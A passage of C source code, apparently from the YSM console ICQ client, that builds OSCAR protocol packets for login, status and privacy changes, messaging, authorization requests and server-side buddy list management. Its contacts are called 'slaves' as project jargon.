        bsAppendTlv(bsd, 0x17, 2, NULL);
        bsAppendWord(bsd, majorVer);

        /* Estos que siguen son valores que supongo que no importan */
        /* que tienen, pero todos son WORD. */
        bsAppendTlv(bsd, 0x18, 2, NULL);
        bsAppendWord(bsd, minorVer);
        bsAppendTlv(bsd, 0x19, 2, NULL);
        bsAppendWord(bsd, lesserVer);
        bsAppendTlv(bsd, 0x1A, 2, NULL);
        bsAppendWord(bsd, buildNum);
        bsAppendTlv(bsd, 0x14, 4, NULL);
        bsAppendDword(bsd, distrNum);

        /* and the final 4 bytes - Language and Country */
        bsAppendTlv(bsd, 0x0F, 2, "en");     /* TLV type 0F */
        bsAppendTlv(bsd, 0x0E, 2, "us");     /* TLV type 0E */

        bsUpdateFlapHeadLen(bsd, flap);

        /* Cruzar dedos y mandar el paquete de Login -A- */
        writeBs(g_model.network.socket, bsd);

        printfOutput(VERBOSE_MOATA, "Login A Sent to the Server\n");

        freeBs(bsd);
        g_state.connected = TRUE;
    }
    else
    {
        printfOutput(VERBOSE_MOATA,
                "Login Init A Failure, bad Server Response.\n"
                "The reply should have been 0001. Exiting..\n");
    }
}

void loginSendCookie(uint8_t *buff, uint16_t cookieLen)
{
    flap_head_bit_t  head;
    uint8_t    buf[4];
    bsd_t      bsd;
    bs_pos_t   flap;

    DEBUG_PRINT("");

    if (buff == NULL)
        return;

    memset(&head, '\0', sizeof(head));
    memset(buf, '\0', 4);

    recv(g_model.network.socket, (char *)&head, sizeof(head), 0);
    recv(g_model.network.socket, &buf[0], 4, 0);

    /* aca tambien el server nos manda el 0001 */
    if (!buf[0] && !buf[1] && !buf[2] && buf[3] == 1)
    {
        bsd = initBs();

        /* flap header */
        flap = bsAppendFlapHead(bsd, head.channelID, BETOH16(head.seq)+1, 0);

        /* copy the 0001 as reply */
        bsAppend(bsd, buf, 4);

        /* TLV type 6 THE COOKIE! */
        bsAppendTlv(bsd, 0x06, cookieLen, buff);

        bsUpdateFlapHeadLen(bsd, flap);

        /* Cruzar dedos y mandar el packet de Login -B (la cookie)- */
        writeBs(g_model.network.socket, bsd);

        freeBs(bsd);
    }
    else
    {
        printfOutput(VERBOSE_MOATA,
                "Weird, When we were going to send the cookie, we didnt receive\n"
                "the 0001 from the server. So its an error, and we are quitting..\n");
        YSM_ERROR(ERROR_CRITICAL, 1);
    }
}


/*
   sendUpdatePrivacy possible settings are:

0x1 : Allow all users to see you.
0x2 : Block all users from seeing you. (Even the visible)
0x3 : Block all users but the Visible list from seeing you.
0x4 : Block users on your deny list.
0x5 : Only allow users in your buddy list.
*/

void sendUpdatePrivacy(uint8_t setting)
{
    bsd_t bsd;

    /* We increment the change count on our buddy list for future chgs */
    g_sinfo.blentries++;

    bsd = initBs();
    bsAppendWord(bsd, 0);                        /* empty item name string16 */
    bsAppendWord(bsd, 0);                        /* grpId == 0, Master Group! */
    bsAppendWord(bsd, g_sinfo.blprivacygroupid); /* item id # */
    bsAppendWord(bsd, 0x0004);                   /* Type == 0x0004 */

    /* Len is a fixed size (sizeof(tlv_bit_t) == 4, + Flag == 1 )    */
    bsAppendWord(bsd, 0x0005); /* len */
    bsAppendTlv(bsd, 0xCA, 1, NULL);
    bsAppendByte(bsd, setting);

    sendSnac(0x13, 0x09, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++,
            0x09 | ((g_sinfo.blentries & 0xFF) << 16));

    freeBs(bsd);
}

int changeStatus(user_status_t status)
{
    bsd_t bsd;

    DEBUG_PRINT("");

    bsd = initBs();

    bsAppendTlv(bsd, 0x06, 0x04, NULL);       /* TLV 0x6 */
    bsAppendWord(bsd, g_model.status_flags); /* status flags */
    bsAppendWord(bsd, status);                /* status */

    bsAppendTlv(bsd, 0x08, 0x02, "\0\0");     /* TLV 0x8 */

    /* TLV 0xC - Direct Connections - */
    bsAppendTlv(bsd, 0x0C, 0x25, NULL);

    if (!g_cfg.dcdisable)
    {
        bsAppendDword(bsd, g_model.dc.rIP_int);
        bsAppendDword(bsd, (uint32_t)g_model.dc.rPort);
    }
    else
    {
        bsAppendDword(bsd, 0);
        bsAppendDword(bsd, 0);
    }

    bsAppendByte(bsd, 0x04);    /* DC flag */

    /* 0x01 for FW, 0x04 for */

    bsAppendWord(bsd, YSM_PROTOCOL_VERSION);

    bsAppendDword(bsd, 0);    /* Connection Cookie */
    /* TODO: This could be important, if we set a cookie    */
    /* here, maybe its the cookie required by any client    */
    /* to connect to us. So we could check if the client    */
    /* connecting to us, ever connected to the icq server    */
    /* (that way, a unique real client)            */

    bsAppendDword(bsd, 0x50); /* web front port */
    bsAppendDword(bsd, 0x03); /* client futures */

    bsAppendDwordLE(bsd, FINGERPRINT_YSM_CLIENT); /* YSM Fingerprint */ 
    bsAppendDword(bsd, 0);
    bsAppendDwordLE(bsd, FINGERPRINT_YSM_CLIENT_CRYPT);
    bsAppendWord(bsd, 0); /* unknown */

    sendSnac(YSM_BASIC_SERVICE_SNAC, 0x1E, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++, 0);

    if (status == STATUS_INVISIBLE)
    {
        sendUpdatePrivacy(0x3);
    }
    else if (g_model.status == STATUS_INVISIBLE)
    {
        /* Were in Invisible and changing to something else
         * we choose 0x4 as default, since it blocks people
         * in the deny list..a common request huh
         */
        sendUpdatePrivacy(0x4);
    }

    g_model.status = status;
    freeBs(bsd);

    return TRUE;
}

void bsAppendMessageHead(
        bsd_t      bsd,
        uin_t      uin,
        int16_t    msgFormat,
        uint32_t  msgTime,
        uint32_t  msgId)
{
    bsAppendDword(bsd, msgTime);                /* mtimestamp */
    bsAppendDword(bsd, msgId);                  /* mID */
    bsAppendWord(bsd, msgFormat);               /* msg sending type */
    bsAppendPrintfString08(bsd, "%ld", uin);    /* uin string08 */
}

void bsAppendMessageBodyType1(
        bsd_t        bsd,
        slave_t     *victim,
        int8_t      *msgData,
        int32_t      msgLen)
{
    bs_pos_t  tlv2;
    bs_pos_t  tlv257;

    tlv2 = bsAppendTlv(bsd, 0x02, 0, NULL);

    /* 0x05 frag id (array of req. capabilities) */
    /* 0x01 fragment version */
    bsAppendTlv(bsd, 0x0501, 1, NULL);
    bsAppendByte(bsd, 0x01);       /* byte array of req. capab. (1 - text) */

    /* 0x01 fragment id (text message) */
    /* 0x01 fragment version */
    tlv257 = bsAppendTlv(bsd, 0x0101, 0, NULL);
    if (victim->caps & CAPFL_UTF8)
        bsAppendWord(bsd, ICBM__IM_SECTION_ENCODINGS_UNICODE); /* encoding */
    else
        bsAppendWord(bsd, ICBM__IM_SECTION_ENCODINGS_ASCII);   /* encoding */
    bsAppendWord(bsd, 0x0);                                    /* language */
    bsAppend(bsd, msgData, msgLen);

    bsUpdateTlvLen(bsd, tlv257);
    bsUpdateTlvLen(bsd, tlv2);
}

void bsAppendMessageBodyType2(
        bsd_t        bsd,
        slave_t     *victim,
        int8_t      *msgData,
        int32_t      msgLen,
        int32_t      msgType,
        uint32_t     msgTime,
        uint32_t     msgId,
        uint8_t      msgFlags,
        uint8_t      sendFlags)
{
    bs_pos_t    tlv5;
    bs_pos_t    tlv2711;

    tlv5 = bsAppendTlv(bsd, 0x05, 0, NULL); /* TVL 0x05: rendezvous msg data */
    bsAppendWord(bsd, 0x00);           /* ack type 0 - normal msg */
    bsAppendDword(bsd, msgTime);       /* copy of head timestamp */
    bsAppendDword(bsd, msgId);         /* copy of head mID */

    /* FIXME: this is aweful. since the scan commands uses a 'specially'
     * crafted message in order to reveal someones real status..and we
     * really dont want to add another parameter nor function for it.
     * we have to code the following aweful comparisons against msgFlags
     * being 0x19 (used only in scan requests). sorry :)
     * Oh, btw, the problem is that we cant send capabilities during scan.
     * If msgFlags are 0x19, we set them to 0x03 afterwards so it works.
     */

    /* capability -> 16 bytes */
    if (msgFlags != 0x19)
    {
        bsAppend(bsd, CAP_PRECAP, sizeof(CAP_PRECAP)-1);
        bsAppend(bsd, CAP_SRVRELAY, sizeof(CAP_SRVRELAY)-1);
        bsAppend(bsd, CAP_POSCAP, sizeof(CAP_POSCAP)-1);
    }
    else
    {
        bsAppend(bsd, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16); /* empty capability */
    }

    bsAppendTlv(bsd, 0x0A, 2, NULL);        /* TLV 0x0A: Acktype2 */
    bsAppendWord(bsd, 0x01);
    bsAppendTlv(bsd, 0x0F, 0, NULL);        /* TLV 0x0F: unknown and empty */

    tlv2711 = bsAppendTlv(bsd, 0x2711, 0, NULL); /* TLV 0x2711: ext. data */

    bsAppendWordLE(bsd, 0x1B);                 /* length till sequence # */
    bsAppendWordLE(bsd, YSM_PROTOCOL_VERSION); /* TCP protocol version */
    bsAppend(bsd, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16); /* empty capability */
    bsAppendWord(bsd, 0x00);                /* unknown */
    bsAppendByte(bsd, 0x03);
    bsAppendDword(bsd, 0x00);               /* msg global type */
    bsAppendWordLE(bsd, 0x00);              /* sequence # */
    bsAppendWordLE(bsd, 0x0E);              /* unknown length */
    bsAppendWordLE(bsd, 0x00);              /* sequence # */
    bsAppend(bsd, "\0\0\0\0\0\0\0\0\0\0\0\0", 12); /* unknown */

    /*** scan fix, read above ****/
    if (msgFlags == 0x19) msgFlags = 0x03;

    bsAppendByte(bsd, msgType);             /* msgType */
    bsAppendByte(bsd, msgFlags);
    bsAppendWordLE(bsd, 0x0000);            /* status code */

    if (victim->status == STATUS_DND)
        bsAppendWordLE(bsd, 0x04);
    else
        bsAppendWordLE(bsd, 0x21);          /* priority */

    bsAppendWordLE(bsd, msgLen + 1);        /* message stringz length */
    bsAppend(bsd, msgData, msgLen);         /* message string */
    bsAppendByte(bsd, 0x00);                /* null-terminator */

    if (sendFlags & MFLAGTYPE_NORM)         /* do we have to insert colors? */
    {
        bsAppendDwordLE(bsd, 0x00000000);   /* text color (rgbn) */
        bsAppendDwordLE(bsd, 0xFFFFFF00);   /* background color (rgbn) */
    }

    /* do we have to insert a GUID? */
    if (sendFlags & MFLAGTYPE_RTF)
    {
        bsAppendDword(bsd, sizeof(CAP_RTF_GUID)-1);
        bsAppend(bsd, CAP_RTF_GUID, sizeof(CAP_RTF_GUID)-1);
    }
    else if (sendFlags & MFLAGTYPE_UTF8)
    {
        bsAppendDword(bsd, sizeof(CAP_UTF8_GUID)-1);
        bsAppend(bsd, CAP_UTF8_GUID, sizeof(CAP_UTF8_GUID)-1);
    }

    bsUpdateTlvLen(bsd, tlv2711);
    bsUpdateTlvLen(bsd, tlv5);
}

void bsAppendMessageBodyType4(
        bsd_t     bsd,
        int8_t   *msgData,
        int32_t   msgLen,
        int32_t   msgType,
        uint8_t   msgFlags)
{
    bs_pos_t  tlv5;

    tlv5 = bsAppendTlv(bsd, 0x05, 0, NULL); /* TLV 0x05: message data */
    bsAppendDwordLE(bsd, g_model.uin);     /* sender uin */
    bsAppendByte(bsd, msgType);             /* message type */
    bsAppendByte(bsd, msgFlags);            /* message flags */
    bsAppendByte(bsd, msgLen + 1);          /* message stringz len */
    bsAppend(bsd, msgData, msgLen);         /* message string */
    bsAppendByte(bsd, 0x00);                /* null-terminator */
    bsUpdateTlvLen(bsd, tlv5);
}

int32_t sendMessage2Client(
        slave_t     *victim,
        int16_t      msgFormat,
        msg_type_t   msgType,
        int8_t      *msgData,
        int32_t      msgLen,
        uint8_t      msgFlags,
        uint8_t      sendFlags,
        req_id_t     reqId)
{
    uint32_t   msgTime = 0;
    uint32_t   msgId = 0;
    bsd_t      bsd;

    DEBUG_PRINT("");

    msgTime = rand() % 0xffff;
    msgId = rand() % 0xffff;

    bsd = initBs();

    bsAppendMessageHead(bsd, victim->uin, msgFormat, msgTime, msgId);

    switch (msgFormat)
    {
        case 0x1:
            bsAppendMessageBodyType1(bsd, victim, msgData, msgLen);
            break;

        case 0x2:
            bsAppendMessageBodyType2(bsd,
                    victim,
                    msgData,
                    msgLen,
                    msgType,
                    msgTime,
                    msgId,
                    msgFlags,
                    sendFlags);
            break;

        case 0x4:
            bsAppendMessageBodyType4(bsd, msgData, msgLen, msgType, msgFlags);
            break;

        default:
            /* unrecognized message type */
            freeBs(bsd);
            return -1;
    }

    /* last empty tlv */
    switch (msgFormat)
    {
        case 0x2:
            /* the scan thingie gets buggy when we send a 3
             * instead of a 6. (as we should). This isn't tidy.
             * scan uses a unique msgFlags of 0x19
             */
            if (msgFlags == 0x19)
                bsAppendTlv(bsd, 0x06, 0, NULL);
            else
                bsAppendTlv(bsd, 0x03, 0, NULL);
            break;

        default:
            bsAppendTlv(bsd, 0x06, 0, NULL);
            break;
    }

    sendSnac(YSM_MESSAGING_SNAC, YSM_MESSAGE_FROM_CLIENT, 0x00,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++,
            reqId);

    freeBs(bsd);
    DEBUG_PRINT("");

    return 0;
}

void sendAuthReq(uin_t uin, uint8_t *nick, uint8_t *message)
{
    bsd_t bsd;

    if (message == NULL)
        message = YSM_DEFAULT_AUTHREQ_MESSAGE;

    bsd = initBs();
    bsAppendPrintfString08(bsd, "%ld", uin);    /* uin string08 */
    bsAppendPrintfString16(bsd, "%s", message); /* reason message string16 */
    bsAppendWord(bsd, 0);                       /* unknown word */

    sendSnac(YSM_ICQV8FUNC_SNAC, CLI_SSI_AUTH_REQ, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++, 0);

    printfOutput(VERBOSE_BASE, "OUT AUTH_REQ %ld %s\n",
            uin,
            nick ? nick : NOT_A_SLAVE);

    freeBs(bsd);
}

void sendAuthRsp(uin_t uin)
{
    bsd_t bsd = initBs();

    bsAppendPrintfString08(bsd, "%ld", uin); /* uin string08 */
    bsAppendByte(bsd, 0x01);                 /* flag: 1-accept, 2-decline */
    bsAppendDword(bsd, 0x00);                /* empty reason string16 */
    bsAppendDword(bsd, 0x00);                /* Extra Flags (Usually 0x0000) */

    sendSnac(YSM_ICQV8FUNC_SNAC, CLI_SSI_AUTH_RSP, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++, 0);

    printfOutput(VERBOSE_BASE, "OUT AUTH_RSP %ld\n", uin);

    freeBs(bsd);
}

void YSM_SendContacts(void)
{
    slave_t *slave = NULL;
    bsd_t    bsd = initBs();

    lockSlaveList();

    while ((slave = getNextSlave(slave)) != NULL)
    {
        bsAppendPrintfString08(bsd, "%ld", (int)slave->uin);
    }

    unlockSlaveList();

    sendSnac(YSM_BUDDY_LIST_SNAC, YSM_CLI_ADD_BUDDY, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++,
            0);

    freeBs(bsd);
}

/* removes buddy from your client-side contact list during session */

void sendRemoveContactReq(uin_t uin)
{
    bsd_t bsd;

    bsd = initBs();
    bsAppendPrintfString08(bsd, "%ld", uin);

    sendSnac(YSM_BUDDY_LIST_SNAC, YSM_CLI_REMOVE_BUDDY, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++,
            0);

    freeBs(bsd);
}

void YSM_BuddyRequestModify(void)
{
    sendSnac(YSM_ICQV8FUNC_SNAC, CLI_SSI_EDIT_BEGIN, 0x0,
            NULL, 0, g_sinfo.seqnum++, 0x11);
}

/* This function goes through the list of slaves that have */
/* the downloaded flag on, searching for the biggest budId */
/* once it finds it, it increments the id by 1 and returns */

static int YSM_BuddyGenNewID(void)
{
    int32_t  newId = 0;
    slave_t *slave = NULL;

    /* slave list is locked in caller function */

    while ((slave = getNextSlave(slave)) != 0)
    {
        if (slave->budType.budId > newId)
            newId = slave->budType.budId;
    }

    newId++;

    return newId;
}

/*
   hehe nice function huh :) well use is this way:

   For adding a Group:
   Item = 0x0, grpName = groupname
   grpID = groupID, budID = 0x0, type = YSM_BUDDY_GROUP
   For adding a Buddy:
   Iteme= slave_t*, grpName = groupname
   grpID = groupID, budID = UIN(int), type = YSM_BUDDY_SLAVE

   the function returns the buddy ID.
   */

/* YSM_BuddyAddItem
 *    if CMD == 0, then ADD ITEM
 *    if CMD == 1, then NOTIFY MASTER
 *
 *    if add_update == CLI_SSI_ADD then ADD
 *    if add_update == CLI_SSI_REMOVE then REMOVE
 *
 *    bID holds a buddy ID. if bID == 0, GENERATE ID
 */

int32_t YSM_BuddyAddItem(
        slave_t     *victim,
        uint8_t     *grpName,
        uint16_t     grpId,
        uint16_t     bID,
        uint32_t     type,
        uint8_t      cmd,
        uint8_t      authAwait,
        uint8_t      subTypeId)
{
    uint8_t      sUIN[MAX_UIN_LEN+1];
    uint8_t     *name = NULL;
    int32_t     *dataListAmount = NULL, buddyId = 0;
    uint32_t     reqId;
    bsd_t        bsd;
    bsd_t        dataList;
    bs_pos_t     addlDataLen;
    uint8_t      nick[MAX_NICK_LEN];

    if (victim == NULL || grpName == NULL)
        return -1;

    bsd = initBs();

    /* We increment the change count on our buddy list for future chgs */
    g_sinfo.blentries++;

    YSM_BuddyRequestModify();

    if (type == YSM_BUDDY_GROUP)
    {
        /* for notifying master */
        dataList = g_sinfo.blgroupsid;
        dataListAmount = &g_sinfo.blgroupsidentries;
        name = grpName;
    }
    else
    {
        memset(sUIN, 0, sizeof(sUIN));
        snprintf(sUIN, MAX_UIN_LEN+1, "%d", (int)victim->uin);
        name = &sUIN[0];

        /* for notifying master */
        dataList = g_sinfo.blusersid;
        dataListAmount = &g_sinfo.blusersidentries;
    }

    /* We are creating this buddy for the first time, don't
     * generate a new random ID for already created ids */
    if (type != YSM_BUDDY_GROUP)
    {
        /* bID is a param to this function
         * usually used for invisible, visible and ignore
         */

        if (!bID)
        {
            if (subTypeId == CLI_SSI_ADD)
            {
                buddyId = YSM_BuddyGenNewID();
                victim->budType.budId = buddyId;
            }
            else
                buddyId = victim->budType.budId;
        }
        else
            buddyId = bID;
    }

    reqId = subTypeId | ((g_sinfo.blentries & 0xFF) << 16);

    switch (cmd)
    {
        /* Called first time, add items */
        case 0:
            bsAppendPrintfString16(bsd, "%s", name);    /* item name string16 */
            bsAppendWord(bsd, grpId);                   /* group id # */
            bsAppendWord(bsd, type == YSM_BUDDY_GROUP   /* item id # */
                    ? 0                                     /* grp item ids are 0 */
                    : buddyId);                             /* adding a buddy */
            bsAppendWord(bsd, type);                    /* item type */
            addlDataLen = bsAppendWord(bsd, 0);         /* addl data len */

            if (type == YSM_BUDDY_GROUP)
            {
                g_sinfo.blysmgroupid = reqId;
            }
            else        /* which would be YSM_BUDDY_SLAVE or..etc */
            {
                /* and now if we are adding a Buddy add on additional data
                 * its Nickname */

                /* TLV 0x131: stores the name that the contact should show up
                 * as in the contact list*/
                bsAppendTlv(bsd, 0x131, strlen(victim->info.nickName),
                        victim->info.nickName);

                /* TLV 0x66: signifies that you are awaiting authorization
                 * for this buddy */
                if (authAwait)
                    bsAppendTlv(bsd, 0x66, 0, NULL);

                /* fill the slave's reqid, so we then know whos who */
                victim->reqId = reqId;
            }

            bsUpdateWordLen(bsd, addlDataLen);
            break;

            /* Generating change on Master Group */
        case 0x1:
            /* Either Master group of groups or Group of Buddies! */

            (*dataListAmount)++;    /* New GroupID ! */

            if (type == YSM_BUDDY_GROUP)
            {
                /* Group! */
                bsAppendWord(bsd, 0);       /* item name: empty string16 */
                bsAppendWord(bsd, 0);       /* group id# (0 - master group) */
            }
            else
            {
                /* Buddy! */
                bsAppendPrintfString16(bsd, "%s", grpName); /* item name string16 */
                bsAppendWord(bsd, grpId);                   /* group id# */
            }

            /* For Both, a new Group or Buddy, the item id# must be 0 and
             * the type must be 0001 since what we are changing here is in
             * both cases a group */

            bsAppendWord(bsd, 0);                       /* item id# (0 - group) */
            bsAppendWord(bsd, 0x01);                    /* item type */
            addlDataLen = bsAppendWord(bsd, 0);         /* addl data len */

            /* add the new Group id if adding a group or user id
             * if adding a user */

            if (type == YSM_BUDDY_GROUP)
                bsAppendWord(dataList, grpId);
            else
            {
                bsAppendWord(dataList, buddyId);
                /* fill the slave's reqid, so we then know whos who */
                victim->reqId = reqId;
            }

            bsAppendTlv(bsd, 0xC8, bsGetLen(dataList), bsGetBuf(dataList));
            bsUpdateWordLen(bsd, addlDataLen);
            break;

        default:
            YSM_ERROR(ERROR_CODE, 1);
            return -1;
            break;
    }

    sendSnac(0x13, subTypeId, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++, reqId);

    freeBs(bsd);

    return buddyId;
}


/* If a buddy is stored in the server, change his/her            */
/* type to our Ignore list so they don't fuck with us no M0re y0!    */
void YSM_BuddyIgnore(slave_t *victim, int flag)
{
    if (flag)    /* Add to Ignore list */
    {
        victim->budType.ignoreId = YSM_BuddyAddItem(victim,
                YSM_BUDDY_GROUPNAME,
                0x0,
                0x0,
                YSM_BUDDY_SLAVE_IGN,
                0, 0, CLI_SSI_ADD);
    }
    else        /* Remove from the Ignore list */
    {
        YSM_BuddyAddItem(victim,
                YSM_BUDDY_GROUPNAME,
                0x0,
                victim->budType.ignoreId,
                YSM_BUDDY_SLAVE_IGN,
                0, 0, CLI_SSI_REMOVE);

        /* Reset the Ignore Flag */
        victim->budType.ignoreId = 0;
    }

    YSM_BuddyRequestFinished();
}


/* If a buddy is stored in the server, change his/her    */
/* type to our block/invisible list so they wont see us  */
void YSM_BuddyInvisible(slave_t *victim, int flag)
{
    if (flag)    /* Add to invisible list */
    {
        victim->budType.invisibleId = YSM_BuddyAddItem(
                victim,
                YSM_BUDDY_GROUPNAME,
                0x0,
                0x0,
                YSM_BUDDY_SLAVE_INV,
                0, 0, CLI_SSI_ADD);
    }
    else        /* Remove from the invisible list */
    {
        YSM_BuddyAddItem(victim,
                YSM_BUDDY_GROUPNAME,
                0x0,
                victim->budType.invisibleId,
                YSM_BUDDY_SLAVE_INV,
                0, 0, CLI_SSI_REMOVE);

        /* Reset the Invisible Flag */
        victim->budType.invisibleId = 0;
    }

    YSM_BuddyRequestFinished();
}


/* If a buddy is stored in the server, change his/her    */
/* type to our Allow/Visible list so they see us when we drink     */
/* the magic potion */
void YSM_BuddyVisible(slave_t *victim, int flag)
{

    if (flag)    /* Add to the Visible list */
    {
        victim->budType.visibleId = YSM_BuddyAddItem(victim,
                YSM_BUDDY_GROUPNAME,
                0x0,
                0x0,
                YSM_BUDDY_SLAVE_VIS,
                0, 0, CLI_SSI_ADD);
    }
    else        /* Remove from the Visible list */
    {
        YSM_BuddyAddItem(victim,
                YSM_BUDDY_GROUPNAME,
                0x0,
                victim->budType.visibleId,
                YSM_BUDDY_SLAVE_VIS,
                0, 0, CLI_SSI_REMOVE);

        /* Reset the Visible Flag */
        victim->budType.visibleId = 0;
    }

    YSM_BuddyRequestFinished();
}

static void buddyAddSlave(
        char     *nick,
        uin_t     uin,
        uint16_t  budId,
        uint16_t  grpId,
        uint16_t  type)
{
    slave_t *new;

    //    DEBUG_PRINT("%s (#%ld)", nick, uin);

    if (new = addSlaveToList(nick, uin, FL_DOWNLOADED, NULL,
                budId, grpId, type))
    {
        addSlaveToDisk(new);
    }
}


/* BuddyDelSlave - removes a slave from the server-side contact list.
*/

void YSM_BuddyDelSlave(slave_t *victim)
{
    if (victim == NULL)
        return;

    printfOutput(VERBOSE_MOATA,
            "INFO REMOVE_SRV %dl %s with budid: %x "
            "and groupd id: %x\n",
            victim->uin, victim->info.nickName,
            victim->budType.budId, victim->budType.grpId);

    YSM_BuddyAddItem(victim,
            YSM_BUDDY_GROUPNAME,
            victim->budType.grpId,
            victim->budType.budId,
            YSM_BUDDY_SLAVE,
            0,               /* cmd */
            0,               /* auth */
            CLI_SSI_REMOVE); /* remove! */
}

void YSM_BuddyRequestFinished(void)
{
    sendSnac(YSM_ICQV8FUNC_SNAC, CLI_SSI_EDIT_END, 0x0,
            NULL, 0, g_sinfo.seqnum++, 0x12);
}

void sendBuddyAck(void)
{
    sendSnac(YSM_ICQV8FUNC_SNAC, CLI_SSI_ACTIVATE, 0x0,
            NULL, 0, g_sinfo.seqnum++, 0);
}

static void YSM_BuddyCreateGroup(void)
{
    /* We initialized the Amount variable to -1, if the group existed while
     * we read the Buddy List but it was empty, we sat 0x0 as its value.
     * (which means no need to create) */

    if (g_sinfo.blusersidentries < 0)
    {
        printfOutput(VERBOSE_MOATA,
                "INFO CREATING YSM Group, doesn't exist!..\n");

        YSM_BuddyAddItem(0x0,
                YSM_BUDDY_GROUPNAME,
                YSM_BUDDY_GROUPID,
                0x0,
                YSM_BUDDY_GROUP,
                0,
                0,
                CLI_SSI_ADD);

        g_sinfo.blusersidentries = 0;
    }
}

void YSM_BuddyUploadList(slave_t *refugee)
{
    slave_t *slave = NULL;
    int      count = 0;

    YSM_BuddyCreateGroup();

    /* slave list must be locked in a caller function */

    if (refugee != NULL)
    {
        if (!IS_DOWNLOADED(refugee->flags))
        {
            YSM_BuddyAddItem(refugee,
                    YSM_BUDDY_GROUPNAME,
                    YSM_BUDDY_GROUPID,
                    0x0,
                    YSM_BUDDY_SLAVE,
                    0,
                    0,
                    CLI_SSI_ADD);
        }
        else
            printfOutput(VERBOSE_BASE,
                    "INFO The slave is already stored online.\n");

        return;
    }

    while ((slave = getNextSlave(slave)) != NULL)
    {
        if (count >= MAX_SAVE_COUNT)
            break;

        if (!IS_DOWNLOADED(slave->flags))
        {
            YSM_BuddyAddItem(
                    slave,
                    YSM_BUDDY_GROUPNAME,
                    YSM_BUDDY_GROUPID,
                    0x0,
                    YSM_BUDDY_SLAVE,
                    0x0,
                    0x0,
                    CLI_SSI_ADD);

            count++;
        }
    }

    printfOutput(VERBOSE_BASE,
            "Please wait until %d results show up (or the few left).\n",
            MAX_SAVE_COUNT);

    printfOutput(VERBOSE_BASE,
            "INFO Use 'save' again to upload the missing slaves "
            "in groups of %d.\n", MAX_SAVE_COUNT);

    if (!count)
        printfOutput(VERBOSE_BASE,
                "-- done with ALL SLAVES" ".\n"
                "Use the 'req' command for those who require auth.\n");
}


void YSM_BuddyIncomingChange(snac_head_t *snac, bsd_t bsd)
{
    slave_t  *slave = NULL;
    uint16_t  incomingReq;

    if (getSlavesListLen() == 0)
        return;

    bsReadWord(bsd, &incomingReq);

    /* Maybe its the ack for our group creation..*/
    /* If so.. */
    if (snac->reqId == g_sinfo.blysmgroupid)
    {
        YSM_BuddyAddItem(0x0,
                YSM_BUDDY_GROUPNAME,
                YSM_BUDDY_GROUPID,
                0x0,
                YSM_BUDDY_GROUP,
                1,
                0,
                CLI_SSI_UPDATE);

        printfOutput(VERBOSE_MOATA,"\n" MSG_BUDDY_GROUPCREATED "\n");

        /* Let it know it can close the contact list */
        YSM_BuddyRequestFinished();

        return;
    }

    lockSlaveList();

    while ((slave = getNextSlave(slave)) != NULL)
    {
        if (snac->reqId == slave->reqId)
        {
            /* If its the Group added ack, just break */
            if (IS_DOWNLOADED(slave->flags))
                break;

            switch (incomingReq)
            {
                case YSM_SRV_BUDDY_NOAUTH:
                    /* Ok! Been acked. Notify the YSM group that
                       it's got a new user. */

                    printfOutput(VERBOSE_BASE,
                            "\n" MSG_BUDDY_SAVING1 "%s"
                            MSG_BUDDY_SAVING2 "%d"
                            MSG_BUDDY_SAVING3,
                            slave->info.nickName, slave->uin);

                    YSM_BuddyAddItem(slave,
                            YSM_BUDDY_GROUPNAME,
                            YSM_BUDDY_GROUPID,
                            0x0, /* new */
                            YSM_BUDDY_SLAVE, 1, 0,
                            CLI_SSI_UPDATE);

                    /* Set the -online- contact flag so we can then
                       know who required auth and who did not */

                    printfOutput(VERBOSE_BASE, "INFO SLAVE_SAVED\n");
                    slave->flags |= FL_DOWNLOADED;
                    break;

                case YSM_SRV_BUDDY_AUTH:
                    /* This slave requires an online auth..ugh. */

                    /* Let the user know he needs auth from the
                       other part in order to add it in the list */

                    printfOutput(VERBOSE_BASE,
                            "\n" MSG_BUDDY_SAVING1 "%s"
                            MSG_BUDDY_SAVING2 "%d"
                            MSG_BUDDY_SAVING3,
                            slave->info.nickName, slave->uin);

                    printfOutput(VERBOSE_BASE,
                            MSG_BUDDY_SAVINGAUTH "\n" 
                            MSG_BUDDY_SAVINGAUTH2
                            MSG_BUDDY_SAVINGAUTH3 "\n");

                    slave -> flags |= FL_DOWNLOADED | FL_AUTHREQ;
                    break;

                case YSM_SRV_BUDDY_ERRADD:
                    printfOutput(VERBOSE_BASE,
                            "ERR SLAVE_SAVE Maybe adding a disabled account?\n");

                    slave->flags |= FL_DOWNLOADED;
                    break;

                    /* Shouldn't happend. Take same action as if
                       a reply for a non-slave arrives, ignore! */

                default:
                    /*
                       Bleh, don't let the user know about this ;P

                       printfOutput(VERBOSE_BASE,
                       " [WARNING]\n" 
                       "Try Again!.\n");

                       Just retry.
                       */
                    printfOutput(VERBOSE_MOATA, "INFO Dijo WARNING\n");

                    YSM_BuddyAddItem(slave,
                            YSM_BUDDY_GROUPNAME,
                            YSM_BUDDY_GROUPID,
                            0x0, /* new */
                            YSM_BUDDY_SLAVE,
                            0, 0, CLI_SSI_ADD);
                    break;
            }

            /* Let it know it can close the contact list */
            YSM_BuddyRequestFinished();
        }
    }

    unlockSlaveList();
}

typedef struct {
    uint8_t  *name;
    uint16_t  groupId;
    uint16_t  itemId;
    uint16_t  type;
    uint16_t  len;
} ssi_item_head_t;

void ssiReadBuddyRecord(ssi_item_head_t *ssi, bsd_t bsd)
{
    uint16_t  xtralen = 0;
    uint8_t  *nick = NULL;
    tlv_t     tlv;
    uin_t     uin;
    bs_pos_t  pos;

    if (ssi == NULL || ssi->name == NULL) /* order matters! */
        return;

    uin = atol(ssi->name);

    /* There are different types of buddies
     * Some maybe be on our ignore list, some on our invisible list, etc */

    xtralen = ssi->len;

    //    hexDumpOutput(buf, xtralen);

    /* We just care about the 0x131 which is the Nick of our slave.
